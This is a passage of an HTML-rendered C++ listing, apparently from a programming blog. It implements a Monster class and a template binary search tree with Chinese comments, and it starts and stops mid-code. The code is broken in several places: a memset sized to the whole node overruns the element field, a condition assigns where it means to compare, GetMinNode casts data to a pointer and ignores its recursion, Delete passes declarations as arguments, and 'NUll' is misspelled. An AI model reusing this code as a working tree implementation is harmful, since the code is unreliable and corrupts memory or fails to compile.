class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;windows.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SUCCESS           \t\t\t  1 <span class=\"comment\">// 执行成功\t</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ERRORR\t\t\t -1 <span class=\"comment\">// 执行失败\t</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//基础怪物模板</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Monster</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"type\">int</span> Id;  <span class=\"comment\">//怪物编号</span></span><br><span class=\"line\">\t<span class=\"type\">char</span> Name[<span class=\"number\">20</span>];<span class=\"comment\">//名字</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> Level;<span class=\"comment\">//等级</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"built_in\">Monster</span>() &#123;&#125;;<span class=\"comment\">//构造 ,默认怪物</span></span><br><span class=\"line\">\t<span class=\"built_in\">Monster</span>(<span class=\"type\">int</span> Id, <span class=\"type\">char</span>* Name, <span class=\"type\">int</span> Level);   <span class=\"comment\">//怪物参数</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">bool</span> Monster::<span class=\"keyword\">operator</span>&lt;(<span class=\"type\">const</span> Monster&amp; p) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>  <span class=\"keyword\">this</span>-&gt;Id &lt; p.Id ? <span class=\"literal\">true</span> : <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> Monster::<span class=\"keyword\">operator</span>&gt;(<span class=\"type\">const</span> Monster&amp; p) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>  <span class=\"keyword\">this</span>-&gt;Id &gt; p.Id ? <span class=\"literal\">true</span> : <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> Monster::<span class=\"keyword\">operator</span>==(<span class=\"type\">const</span> Monster&amp; p) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>   <span class=\"keyword\">this</span>-&gt;Id == p.Id ? <span class=\"literal\">true</span> : <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Monster::<span class=\"built_in\">Monster</span>(<span class=\"type\">int</span> Id, <span class=\"type\">char</span>* Name, <span class=\"type\">int</span> Level) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>-&gt;Id = Id;</span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(&amp;<span class=\"keyword\">this</span>-&gt;Name, Name, <span class=\"built_in\">strlen</span>(Name)+<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>-&gt;Level=Level;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TreeNode</span> &#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\tT element; <span class=\"comment\">//节点数据</span></span><br><span class=\"line\">\tTreeNode&lt;T&gt;* pLeft; <span class=\"comment\">//左树指针</span></span><br><span class=\"line\">\tTreeNode&lt;T&gt;* pRight;<span class=\"comment\">//右树指针</span></span><br><span class=\"line\">\tTreeNode&lt;T&gt;* pParent;<span class=\"comment\">//父节点指针</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">TreeNode</span>(T&amp; ele) &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//初始化</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(&amp;element, <span class=\"number\">0</span>, <span class=\"built_in\">sizeof</span>(TreeNode));</span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>(&amp;element, &amp;ele, <span class=\"built_in\">sizeof</span>(T));</span><br><span class=\"line\">\t\tpLeft = pRight = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\tbool operator&lt;(const TreeNode&lt;T&gt;&amp; p) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\treturn  this-&gt;element&lt;p-&gt;element  ? true : false;</span></span><br><span class=\"line\"><span class=\"comment\">\t&#125;</span></span><br><span class=\"line\"><span class=\"comment\">\tbool operator&gt;(const TreeNode&lt;T&gt;&amp; p) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\treturn this-&gt;element&gt;p-&gt;element ? true : false;</span></span><br><span class=\"line\"><span class=\"comment\">\t&#125;</span></span><br><span class=\"line\"><span class=\"comment\">\tbool operator==(const TreeNode&lt;T&gt;&amp; p) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\treturn this-&gt;element == p-&gt;element ? true : false;</span></span><br><span class=\"line\"><span class=\"comment\">\t&#125;*/</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">BsortTree</span> &#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"built_in\">BsortTree</span>();</span><br><span class=\"line\">\t~<span class=\"built_in\">BsortTree</span>();</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">InOrderTraverse</span><span class=\"params\">(TreeNode&lt;T&gt;* pNode)</span></span>; <span class=\"comment\">//中序遍历</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">PreOrderTraverse</span><span class=\"params\">(TreeNode&lt;T&gt;* pNode)</span></span>;<span class=\"comment\">//前序遍历</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">PostOrderTraverse</span><span class=\"params\">(TreeNode&lt;T&gt;* pNode)</span></span>;<span class=\"comment\">//后序遍历</span></span><br><span class=\"line\">\t<span class=\"function\">TreeNode&lt;T&gt;* <span class=\"title\">GetRoot</span><span class=\"params\">()</span></span>;<span class=\"comment\">//返回根节点</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">GetDepth</span><span class=\"params\">(TreeNode&lt;T&gt;* Node)</span></span>;<span class=\"comment\">// 返回当前节点高度</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">IsEmpty</span><span class=\"params\">()</span></span>;<span class=\"comment\">//判断树是否为空</span></span><br><span class=\"line\">\t<span class=\"function\">DWORD <span class=\"title\">Insert</span><span class=\"params\">(T element)</span></span>;<span class=\"comment\">//新增节点</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Delete</span><span class=\"params\">(T element)</span></span>;<span class=\"comment\">//删除节点</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Init</span><span class=\"params\">()</span></span>;<span class=\"comment\">//初始化一些数值</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">clear</span><span class=\"params\">(TreeNode&lt;T&gt;* pNode)</span></span>;<span class=\"comment\">//删除所有节点</span></span><br><span class=\"line\">\t<span class=\"function\">DWORD <span class=\"title\">InsertNode</span><span class=\"params\">(TreeNode&lt;T&gt;* pNode, T element)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">TreeNode&lt;T&gt;* <span class=\"title\">DeleteNode</span><span class=\"params\">(T element, TreeNode&lt;T&gt;* pNode)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">TreeNode&lt;T&gt;* <span class=\"title\">GetMinNode</span><span class=\"params\">(TreeNode&lt;T&gt;* pNode)</span></span>;<span class=\"comment\">//获取以pNode为根的最小节点，注：删除NODE下，寻找PNODE右树的最小节点顶到NODE节点上。再删除原最小节点</span></span><br><span class=\"line\">\t<span class=\"function\">TreeNode&lt;T&gt;* <span class=\"title\">GetMaxNode</span><span class=\"params\">(TreeNode&lt;T&gt;* pNode)</span></span>;<span class=\"comment\">//获取以pNode为根的最大节点</span></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\tTreeNode&lt;T&gt;* pRootNode; <span class=\"comment\">//根节点指针</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> size;<span class=\"comment\">//树中元素总数</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">TreeNode&lt;T&gt;* BsortTree&lt;T&gt;::<span class=\"built_in\">GetMinNode</span>(TreeNode&lt;T&gt;* pNode) &#123;</span><br><span class=\"line\">\tTreeNode&lt;T&gt;* pMin = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pNode!=<span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> data = pNode-&gt;element;<span class=\"comment\">//说一下，这里为什么不用T类型，因为T代表整个类型大小，但是我们只需要NODE头4个字节的数据,这里有一点不通用，节点的头四个字节数据类型被限制了。</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (data&gt;=pNode-&gt;element) &#123;</span><br><span class=\"line\">\t\t\tpMin = (TreeNode&lt;T&gt;*)pNode-&gt;element;<span class=\"comment\">//把下一个比较小的节点存起来</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">GetMinNode</span>(pNode-&gt;pLeft); <span class=\"comment\">//这里为什么用pNode-&gt;pLeft呢，因为根据左树节点比根树节点小。</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> pMin;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">TreeNode&lt;T&gt;* BsortTree&lt;T&gt;::<span class=\"built_in\">DeleteNode</span>(T element, TreeNode&lt;T&gt;* pNode) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pRootNode == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (element == pNode-&gt;element)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (pNode-&gt;pLeft != <span class=\"literal\">NULL</span> &amp;&amp; pNode-&gt;pRight == <span class=\"literal\">NULL</span>) </span><br><span class=\"line\">\t\t&#123;<span class=\"comment\">//左子树</span></span><br><span class=\"line\">\t\t\tTreeNode&lt;T&gt;* pPt = pNode-&gt;pParent;<span class=\"comment\">//拿到当前节点的父节点</span></span><br><span class=\"line\">\t\t\tpPt-&gt;pLeft = pNode-&gt;pLeft;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">delete</span> pNode;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pNode-&gt;pLeft = <span class=\"literal\">NULL</span> &amp;&amp; pNode-&gt;pRight != <span class=\"literal\">NULL</span>) </span><br><span class=\"line\">\t\t&#123;<span class=\"comment\">//右子树</span></span><br><span class=\"line\">\t\t\tTreeNode&lt;T&gt;* pPt = pNode-&gt;pParent;<span class=\"comment\">//拿到当前节点的父节点</span></span><br><span class=\"line\">\t\t\tpPt-&gt;pRight = pNode-&gt;pRight;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">delete</span> pNode;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pNode-&gt;pLeft == <span class=\"literal\">NULL</span>&amp;&amp;pNode-&gt;pRight == <span class=\"literal\">NULL</span>) </span><br><span class=\"line\">\t\t&#123;<span class=\"comment\">//左右树均为空</span></span><br><span class=\"line\">\t\t\tTreeNode&lt;T&gt;* p;</span><br><span class=\"line\">\t\t\tp = pNode-&gt;pParent;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (p-&gt;pLeft != <span class=\"literal\">NULL</span>&amp;&amp;p-&gt;pRight == <span class=\"literal\">NULL</span>) &#123;<span class=\"comment\">//这里实际意义就是看当前节点在父节点的左边还是右边</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">delete</span> p-&gt;pLeft;</span><br><span class=\"line\">\t\t\t\tp-&gt;pLeft = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (p-&gt;pLeft == <span class=\"literal\">NULL</span>&amp;&amp;p-&gt;pRight != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">delete</span> p-&gt;pRight;</span><br><span class=\"line\">\t\t\t\tp-&gt;pRight = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">delete</span> p-&gt;pRight;</span><br><span class=\"line\">\t\t\tp-&gt;pRight = <span class=\"literal\">NULL</span>;     <span class=\"comment\">//这两行就是代表子节点一样，且不为空，删除哪个都一样。</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pNode-&gt;pLeft != <span class=\"literal\">NULL</span>&amp;&amp;pNode-&gt;pRight != <span class=\"literal\">NULL</span>) &#123;<span class=\"comment\">//左右子树均不为空</span></span><br><span class=\"line\">\t\t\tTreeNode&lt;T&gt;* pCurrent = pNode-&gt;pRight;</span><br><span class=\"line\">\t\t\tTreeNode&lt;T&gt;* pMin = <span class=\"built_in\">GetMinNode</span>(pNode-&gt;pRight);<span class=\"comment\">//GetMinNode是一个递归函数，返回NODE子树里的最小节点</span></span><br><span class=\"line\">\t\t\tpNode-&gt;element = (<span class=\"type\">int</span>)pMin;<span class=\"comment\">//把最小的节点元素抬到Pnode节点这里来</span></span><br><span class=\"line\">\t\t\t<span class=\"built_in\">DeleteNode</span>(pNode-&gt;element, pCurrent);<span class=\"comment\">//此时此刻，Pnode已经替换为最小节点的元素了，</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\t <span class=\"comment\">//那么只需要删除pCurrent（pNode-&gt;pRight）下的子树最小节点就可以了，这里用的递归。</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (element &gt; pNode-&gt;element) </span><br><span class=\"line\">\t\t&#123;<span class=\"comment\">//Element 大于Pnode的E。那么就往Pnode右树开始找</span></span><br><span class=\"line\">\t\t\t<span class=\"built_in\">DeleteNode</span>(element, pNode-&gt;pRight);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">DeleteNode</span>(element, pNode-&gt;pLeft);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"type\">void</span> BsortTree&lt;T&gt;::<span class=\"built_in\">Delete</span>(T element) &#123;</span><br><span class=\"line\">\t<span class=\"built_in\">DeleteNode</span>(T element, TreeNode&lt;T&gt;* pNode);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">DWORD BsortTree&lt;T&gt;::<span class=\"built_in\">InsertNode</span>(TreeNode&lt;T&gt;* pNode, T element) &#123;</span><br><span class=\"line\">\t<span class=\"comment\">//建立一个节点，把元素存进去</span></span><br><span class=\"line\">\tTreeNode&lt;T&gt;* pElement = <span class=\"keyword\">new</span> <span class=\"built_in\">TreeNode</span>&lt;T&gt;(element);</span><br><span class=\"line\">\t<span class=\"comment\">//如果元素等于当前节点就直接返回</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pNode-&gt;element==element  ) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//如果pnode节点的左子节点为null且element&lt;pnode节点</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pNode-&gt;pLeft == <span class=\"literal\">NULL</span> &amp;&amp; pNode-&gt;element&gt;element  ) &#123;</span><br><span class=\"line\">\t\tpNode-&gt;pLeft = pElement;</span><br><span class=\"line\">\t\tsize++;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//如果pnode节点的右子节点为null且element&gt;pnode节点</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pNode-&gt;pRight == <span class=\"literal\">NULL</span>&amp;&amp;pNode-&gt;element&lt;element  ) &#123;</span><br><span class=\"line\">\t\tpNode-&gt;pRight = pElement;</span><br><span class=\"line\">\t\tsize++;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//pnode左节点不为空且element&lt;pnode节点----------此处为递归</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pNode-&gt;element&gt;element) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"built_in\">InsertNode</span>(pNode-&gt;pLeft, element);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">InsertNode</span>(pNode-&gt;pRight, element);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">DWORD BsortTree&lt;T&gt;::<span class=\"built_in\">Insert</span>(T element) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!pRootNode) &#123;<span class=\"comment\">//如果根节点为空</span></span><br><span class=\"line\">\t\tpRootNode = <span class=\"keyword\">new</span> <span class=\"built_in\">TreeNode</span>&lt;T&gt;(element);</span><br><span class=\"line\">\t\tsize++;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"built_in\">InsertNode</span>(pRootNode, element);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"type\">bool</span> BsortTree&lt;T&gt;::<span class=\"built_in\">IsEmpty</span>() &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> size == <span class=\"number\">0</span> ? <span class=\"literal\">true</span> : <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">BsortTree&lt;T&gt;::~<span class=\"built_in\">BsortTree</span>() &#123;</span><br><span class=\"line\">\t<span class=\"comment\">//循环删除节点元素</span></span><br><span class=\"line\">\t<span class=\"built_in\">clear</span>(pRootNode);</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"type\">void</span> BsortTree&lt;T&gt;::<span class=\"built_in\">clear</span>(TreeNode&lt;T&gt;* pNode) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pNode != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">clear</span>(pNode-&gt;pLeft);</span><br><span class=\"line\">\t\t<span class=\"built_in\">clear</span>(pNode-&gt;pRight);</span><br><span class=\"line\">\t\t<span class=\"keyword\">delete</span> pNode;</span><br><span class=\"line\">\t\tpNode = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">BsortTree&lt;T&gt;::<span class=\"built_in\">BsortTree</span>() &#123;</span><br><span class=\"line\">\t<span class=\"built_in\">Init</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;<span class=\"comment\">// 返回当前节点高度,Node</span></span><br><span class=\"line\"><span class=\"type\">int</span> BsortTree&lt;T&gt;::<span class=\"built_in\">GetDepth</span>(TreeNode&lt;T&gt;* Node) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (Node == NUll) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span 